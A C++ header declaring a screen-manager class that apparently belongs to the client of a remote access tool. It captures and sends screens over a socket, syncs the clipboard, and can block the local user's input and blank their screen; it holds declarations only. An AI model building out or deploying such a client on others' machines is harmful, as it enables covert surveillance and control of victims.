// ScreenManager.h: interface for the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENMANAGER_H__737AA8BC_7729_4C54_95D0_8B1E99066D48__INCLUDED_)
#define AFX_SCREENMANAGER_H__737AA8BC_7729_4C54_95D0_8B1E99066D48__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"
#include "ScreenSpy.h"

class CScreenManager : public CManager  
{
public:
	CScreenManager(CClientSocket *pClient);
	virtual ~CScreenManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBitmapInfo();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsResolutionChange();
	int  GetCurrentPixelBits();
	BOOL m_bIsWorking;
	BOOL m_bIsBlockInput;
	BOOL m_bIsBlankScreen;

private:
	BYTE	m_bAlgorithm;
	BOOL	m_bIsCaptureLayer;
	int		m_biBitCount;
	BOOL	m_bIsComposition;
	HDC		m_hDeskTopDC;
	HANDLE	m_hWorkThread, m_hCtrlThread;
	CCursorInfo	m_CursorInfo;
	CScreenSpy	*m_pScreenSpy;
	BOOL GetAeroComposition();
	void SetAeroComposition(UINT uCompositionAction);
	void ResetScreen(int biBitCount);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI	CtrlThread(LPVOID lparam);
};

#endif // !defined(AFX_SCREENMANAGER_H__737AA8BC_7729_4C54_95D0_8B1E99066D48__INCLUDED_)
